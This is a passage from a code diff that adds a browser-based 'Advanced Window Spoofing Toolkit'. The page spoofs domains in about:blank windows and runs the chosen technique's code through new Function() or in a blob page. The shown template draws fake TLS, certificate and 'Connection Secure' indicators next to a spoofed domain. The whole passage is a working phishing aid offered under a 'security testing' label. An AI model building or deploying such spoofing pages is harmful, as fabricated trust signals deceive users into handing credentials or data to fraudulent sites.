+                <p style="color: #a5b4fc; margin: 20px 0;">Establishing encrypted tunnel to ${config.spoofDomain}</p>
+                <div style="width: 300px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px;">
+                    <div id="secureProgress" style="width: 0%; height: 100%; background: #7c3aed; border-radius: 2px;"></div>
+                </div>
+                <div style="margin-top: 30px; font-size: 12px; color: #94a3b8;">
+                    <div>✓ TLS 1.3 Handshake Complete</div>
+                    <div>✓ Certificate Verified</div>
+                    <div>✓ End-to-End Encryption Active</div>
+                </div>
+            </div>
+            <script>
+                // Animate progress
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 2;
+                    document.getElementById('secureProgress').style.width = progress + '%';
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        // Simulate redirect
+                        setTimeout(() => {
+                            document.body.innerHTML += '<div style="position: fixed; top: 20px; right: 20px; background: #10b981; color: white; padding: 10px; border-radius: 5px;">🔐 Connection Secure</div>';
+                        }, 500);
+                    }
+                }, 50);
+            <\/script>
+        \`;
+    }
+}, ${config.delay});`
+                }
+            };
+            
+            const tech = techniques[config.currentTechnique];
+            if (tech) {
+                document.getElementById('selectedTechTitle').textContent = tech.title;
+                document.getElementById('techDescription').innerHTML = `
+                    <p style="color: #cbd5e1; margin-bottom: 15px; line-height: 1.6;">${tech.description}</p>
+                    <div class="feature-tag">Opens in new tab/window</div>
+                    <div class="feature-tag">Basic about:blank parameter</div>
+                    <div class="feature-tag">URL Spoofing</div>
+                `;
+                document.getElementById('codePreview').textContent = tech.code;
+            }
+        }
+
+        // Execute selected technique
+        function executeSelectedTechnique() {
+            updateConfig();
+            
+            logSystem.add(`Executing technique: ${config.currentTechnique}`, 'info');
+            logSystem.add(`Target: ${config.targetUrl} | Spoofing: ${config.spoofDomain}`, 'info');
+            
+            try {
+                // Execute based on selected technique
+                const code = document.getElementById('codePreview').textContent;
+                
+                // Create a function from the code and execute it
+                const executeCode = new Function(code);
+                executeCode();
+                
+                logSystem.add(`Technique executed successfully`, 'success');
+                logSystem.add(`Window opened with ${config.currentTechnique} method`, 'info');
+                
+            } catch (error) {
+                logSystem.add(`Error executing technique: ${error.message}`, 'error');
+                console.error('Execution error:', error);
+            }
+        }
+
+        // Open in new tab
+        function openInNewTab() {
+            updateConfig();
+            
+            // Create a new HTML file with the technique
+            const techCode = document.getElementById('codePreview').textContent;
+            const fullHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Technique: ${config.currentTechnique}</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
+        pre { background: #f8f9fa; padding: 20px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>${config.currentTechnique}</h1>
+        <p>Target: ${config.targetUrl}</p>
+        <button onclick="runTechnique()" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px;">Run Technique</button>
+        <hr>
+        <h3>Code:</h3>
+        <pre>${techCode}</pre>
+    </div>
+    <script>
+        ${techCode}
+    <\/script>
+</body>
+</html>`;
+            
+            const blob = new Blob([fullHTML], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            window.open(url, '_blank');
+            
+            logSystem.add(`Opened technique in new tab`, 'info');
+        }
+
+        // Copy code to clipboard
+        function copyCode() {
+            const code = document.getElementById('codePreview').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                logSystem.add('Code copied to clipboard', 'success');
+            }).catch(err => {
+                logSystem.add('Failed to copy code: ' + err, 'error');
+            });
+        }
+
+        // Export log
+        function exportLog() {
+            logSystem.export();
+        }
+
+        // Clear log
+        function clearLog() {
+            logSystem.clear();
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Update config on input changes
+            ['targetUrl', 'spoofDomain', 'windowSize', 'delay'].forEach(id => {
+                document.getElementById(id).addEventListener('change', updateConfig);
+            });
+            
+            // Initial setup
+            updateTechniquePreview();
+            logSystem.add('Advanced Window Spoofing Toolkit initialized', 'success');
+            logSystem.add('Ready for security testing - Select a technique and configure parameters', 'info');
+            logSystem.add(`Current target: ${config.targetUrl}`, 'info');
+        });
+    </script>
+</body>
+</html>
